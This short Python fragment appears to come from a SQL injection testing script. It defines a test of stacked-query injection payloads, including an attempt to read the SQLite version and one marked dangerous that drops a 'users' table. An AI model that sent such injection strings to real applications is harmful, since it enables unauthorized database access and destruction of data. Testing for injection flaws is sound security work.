print("\n" + "="*70)
print("TEST 5: ERROR-BASED SQLi - STACKED QUERIES")
print("="*70)

print("\n[+] Testing stacked queries...")

stacked_payloads = [
    ("SELECT 1", "'; SELECT 1--"),
    ("SELECT version", "'; SELECT sqlite_version()--"),
    ("DROP test (DANGEROUS - don't execute)", "'; DROP TABLE users--"),
]

